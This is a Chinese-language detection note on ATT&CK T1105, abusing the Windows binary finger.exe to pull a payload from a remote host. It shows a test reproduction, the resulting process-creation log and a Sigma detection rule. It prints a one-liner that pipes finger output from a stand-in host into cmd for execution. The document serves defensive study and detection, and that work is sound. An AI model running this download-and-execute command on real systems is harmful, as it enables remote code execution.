# T1105-win-入口工具转移-# Finger.exe(白名单)

## 来自ATT&CK的描述

攻击者可能会将工具或其他文件从外部系统转移到被攻击的环境中。可以通过命令和控制通道从外部攻击者控制的系统复制文件，用以将工具带入被攻击的网络中，或通过其他工具（如 FTP）的替代协议。 也可以使用 scp、rsync 和 sftp等本地工具在Mac和 Linux上复制文件。

## 测试案例
Finger.exe显示有关正在运行Finger服务或守护程序的指定远程计算机（通常是运行UNIX的计算机）上的一个或多个用户的信息。 远程计算机指定用户信息显示的格式和输出。 不带参数使用，手指显示帮助。

**路径:**
```
-   c:\windows\system32\finger.exe
-   c:\windows\syswow64\finger.exe
```

从远程Finger服务器下载有效载荷(Payload)。 此示例连接到“example.host.com”，询问用户“user”； 结果可能包含由cmd进程执行的恶意shellcode。
```
finger user@example.host.com | more +2 | cmd
```

用例：下载恶意负载
所需权限：用户
操作系统：Windows 8.1、Windows 10、Windows 11、Windows Server 2008、Windows Server 2008R2、Windows Server 2012、Windows Server 2012R2、Windows Server 2016、Windows Server 2019、Windows Server 2022
## 检测日志

windows安全日志

## 测试复现
Windows 10 测试
```
C:\Users\liyang>Finger.exe

显示与运行手指服务的指定系统上某个用户有关
的信息。输出因远程系统而异。

FINGER [-l] [user]@host [...]

  -l        以长列表格式显示信息。
  user      指定需要其信息的用户。省略 user 参数
            将显示与指定主机上所有用户有关的信息。
  @host     指定需要其用户信息的远程系统上的服务器。

C:\Users\liyang>finger user@example.host.com | more +2 | cmd
Microsoft Windows [版本 10.0.18363.418]
(c) 2019 Microsoft Corporation。保留所有权利。
```

## 测试留痕
```log
已创建新进程。

  

创建者主题:

安全 ID: DESKTOP-PT656L6\liyang

帐户名: liyang

帐户域: DESKTOP-PT656L6

登录 ID: 0x47126

  

目标主题:

安全 ID: NULL SID

帐户名: -

帐户域: -

登录 ID: 0x0

  

进程信息:

新进程 ID: 0x2c8

新进程名称: C:\Windows\System32\finger.exe

令牌提升类型: %%1938

强制性标签: Mandatory Label\Medium Mandatory Level

创建者进程 ID: 0xc78

创建者进程名称: C:\Windows\System32\cmd.exe

进程命令行: finger  user@example.host.com
```
## 检测方法/思路
参考Sigma官方规则:
```yml
title: Finger.exe Suspicious Invocation

id: af491bca-e752-4b44-9c86-df5680533dbc

description: Detects suspicious aged finger.exe tool execution often used in malware attacks nowadays

author: Florian Roth, omkar72, oscd.community

date: 2021/02/24

references:

- https://twitter.com/bigmacjpg/status/1349727699863011328?s=12

- https://app.any.run/tasks/40115012-a919-4208-bfed-41e82cb3dadf/

- http://hyp3rlinx.altervista.org/advisories/Windows_TCPIP_Finger_Command_C2_Channel_and_Bypassing_Security_Software.txt

tags:

- attack.command_and_control

- attack.t1105

logsource:

category: process_creation

product: windows

detection:

selection:

Image|endswith: '\finger.exe' #单纯的对进程名称进行检测

condition: selection

falsepositives:

- Admin activity (unclear what they do nowadays with finger.exe)

level: high
```

### 建议
从Sigma给出的规则来看，更多的是对进程和命令行参数进行监测，只要出现其中一个命令参数即告警。
## 参考推荐

MITRE-ATT&CK-T1105

<https://attack.mitre.org/techniques/T1105>

Finger.exe

<https://lolbas-project.github.io/lolbas/Binaries/Finger/>

Finger使用方法

<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/ff961508(v=ws.11)>

Sigma: win_susp_finger_usage

<https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_susp_finger_usage.yml>